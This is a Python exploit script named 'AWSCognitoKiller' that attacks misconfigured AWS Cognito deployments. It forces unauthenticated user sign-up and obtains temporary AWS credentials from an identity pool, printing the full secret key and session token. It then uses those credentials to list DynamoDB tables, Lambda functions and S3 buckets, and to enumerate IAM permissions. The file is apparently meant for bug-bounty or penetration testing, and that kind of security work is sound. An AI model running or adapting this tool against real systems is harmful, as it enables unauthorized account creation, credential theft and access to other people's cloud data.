import requests
import json
import argparse
import subprocess
from subprocess import PIPE
from enumerate_iam.main import enumerate_iam
import hashlib
import hmac
import base64
import boto3

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ExploitAWSCognito:
	def __init__(self, username, password, enumiam):
		self.region = None
		self.username = username
		self.password = password
		self.clientId = None
		self.identityPoolId = None
		self.userPoolId = None
		self.cognitoSecret = None
		self.enumiam = None

	def update(self, clientId=None, identityPoolId=None, userPoolId=None, cognitoSecret=None, enumiam=None):
		if clientId:
			self.region = clientId.split(":")[0]
			self.clientId = clientId.split(":")[1]
		if identityPoolId:
			self.region = identityPoolId.split(":")[0]
			self.identityPoolId = identityPoolId.split(":")[1]
		if userPoolId:
			self.userPoolId = userPoolId
		if cognitoSecret:
			self.cognitoSecret = cognitoSecret
		if enumiam:
			self.enumiam = enumiam


	def unauthen_exploit(self):
		self.logProc("\n=================================> EXPLOITING AWS COGNITO UNAUTHEN MISCONFIGURATION <=================================\n")
		if self.clientId:
			r = subprocess.Popen(["aws", "cognito-idp", "sign-up", "--client-id", self.clientId, "--username", self.username, "--password", self.password, "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
			stdout, stderr = r.communicate()
			if len(stdout) > 0:
				self.logProc(f"[+] {self.region}:{self.clientId} - Force SignUp Check stdout: {stdout}")
			if len(stderr) > 0:
				self.logError(f"[+] {self.region}:{self.clientId} - Force SignUp Check stderr: {stderr}")
				if b"InvalidParameterException" in stderr:
								self.logError(f"[+] {self.region}:{self.clientId} - Might be vuln but you need to manual modify sign up parameter!")
				if b'is configured for secret but secret was not received' in stderr:
					if self.cognitoSecret:
						secret_hash = base64.b64encode(hmac.new(self.cognitoSecret.encode(), msg=f"{self.username}{self.clientId}".encode(), digestmod=hashlib.sha256).digest())
						r = subprocess.Popen(["aws", "cognito-idp", "sign-up", "--client-id", self.clientId, "--username", self.username, "--password", self.password, "--region", self.region, "--secret-hash", secret_hash], shell=True, stdout=PIPE, stderr=PIPE)
						stdout, stderr = r.communicate()
						if len(stdout) > 0:
							self.logProc(f"[+] {self.region}:{self.clientId} - Force SignUp Check stdout: {stdout}")
						if len(stderr) > 0:
							self.logError(f"[+] {self.region}:{self.clientId} - Force SignUp Check stderr: {stderr}")
							if b"InvalidParameterException" in stderr:
								self.logError(f"[+] {self.region}:{self.clientId} - Might be vuln but you need to manual add the require attributes!")
					else:
						self.logError(f"[+] {self.region}:{self.clientId} - Might be vuln but you need to find cognito application secret and check again! ")

		if self.identityPoolId:
			r = subprocess.Popen(["aws", "cognito-identity", "get-id", "--identity-pool-id", f"{self.region}:{self.identityPoolId}", "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
			stdout, stderr = r.communicate()
			if len(stderr) > 0: 
				self.logError(f"[+] {self.region}:{self.identityPoolId} - Force Generate Identity ID stderr: {stderr}")

			if b'"IdentityId"' in stdout:
				json_stdout = json.loads(stdout)
				self.logProc(f"[+] {self.region}:{self.identityPoolId} - Force Generate Identity ID stdout: {json_stdout}")
				r = subprocess.Popen(["aws", "cognito-identity", "get-credentials-for-identity", "--identity-id", json_stdout["IdentityId"], "--region", self.region], shell=True, stdout=PIPE, stderr=PIPE)
				stdout, stderr = r.communicate()
				if len(stderr) > 0:
					self.logError(f"[+] {self.region}:{self.identityPoolId} - Force Generate AWS credentials from Identity ID stderr: {stderr}")

				if b'"Credentials"' in stdout:
					json_stdout = json.loads(stdout)
					IdentityId =  json_stdout['IdentityId']
					AccessKeyId = json_stdout['Credentials']['AccessKeyId']
					SecretKey = json_stdout['Credentials']['SecretKey']
					SessionToken = json_stdout['Credentials']['SessionToken']
					Expiration = json_stdout['Credentials']['Expiration']
					self.logProc(f"[+] {self.region}:{self.identityPoolId} - Unauthorized access to AWS services due to Liberal AWS Credentials !!!")
					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - IdentityId: {IdentityId}")
					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - AccessKeyId: {AccessKeyId}")
					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - SecretKey: {SecretKey}")
					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - SessionToken: {SessionToken}")
					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - Expiration: {Expiration}")

					self.logProc(f"[+] {self.region}:{self.identityPoolId} - Enumerate AWS services permissions !!!")
					try:
						dynamodb = boto3.client("dynamodb", aws_access_key_id=AccessKeyId, aws_secret_access_key=SecretKey, aws_session_token=SessionToken)
						r = dynamodb.list_tables()
						self.logProc(f"\t[!] dynamodb.list_tables: {r}")
					except:
						self.logError(f"\t[-] dynamodb.list_tables: failed")

					try:
						lambdaclient = boto3.client("lambda", aws_access_key_id=AccessKeyId, aws_secret_access_key=SecretKey, aws_session_token=SessionToken)
						r = lambdaclient.list_functions()
						self.logProc(f"\t[!] lambdaclient.list_functions: {r}")
					except:
						self.logError(f"\t[-] lambdaclient.list_functions: failed")

					try:
						s3client = boto3.client("s3", aws_access_key_id=AccessKeyId, aws_secret_access_key=SecretKey, aws_session_token=SessionToken)
						r = s3client.list_buckets()
						self.logProc(f"\t[!] s3client.list_buckets: {r}")
					except:
						self.logError(f"\t[-] s3client.list_buckets: failed")

					if self.enumiam:
						enumerate_iam(AccessKeyId, SecretKey, SessionToken, self.region)

	def postauthen_exploit(self):
		pass


	def logProc(self, message):
		print(f"{message}")

	def logError(self, message):
		print(f"{message}")
		


if __name__ == "__main__":
	msg = "AWSCognitoKiller\nregion + username + password are required!!!\nExample Usage: python .\AWSCognitoKiller.py -region \"us-east-1\" -userPoolId \"us-east-1_f969OmVb5\" -clientId \"72ivtupb7fe0u5naa3jpu720k7\" -username \"ltidi@wearehackerone.com\" -password \"Abcd@1234\""
	parser = argparse.ArgumentParser(description=msg)
	parser.add_argument("-region", "--region", help = "Application Region")
	parser.add_argument("-userPoolId", "--user-pool-id", help = "User Pool ID")
	parser.add_argument("-clientId", "--client-id", help = "Client ID")
	parser.add_argument("-identityPoolId", "--identity-pool-id", help = "Identity Pool ID")
	parser.add_argument("-username", "--username", help = "Username")
	parser.add_argument("-password", "--password", help = "Password")
	parser.add_argument("-enumiam", "--enum-iam", help = "Enum IAM")
	parser.add_argument("-cognitosecret", "--cognito-secret", help = "Cognito Secret")

	args = parser.parse_args()
	if args.username == None or args.password == None:
		print(msg)
		exit()

	exploit_instance = ExploitAWSCognito(args.username.strip(), args.password.strip(), "enum_iam" in args)

	if args.client_id:
		exploit_instance.update(clientId=args.client_id.strip())
	if args.identity_pool_id:
		exploit_instance.update(identityPoolId=args.identity_pool_id.strip())
	if args.cognito_secret:
		exploit_instance.update(cognitoSecret=args.cognito_secret.strip())
	if args.enum_iam:
		exploit_instance.update(enumiam=args.enum_iam.strip())
	
	exploit_instance.unauthen_exploit()
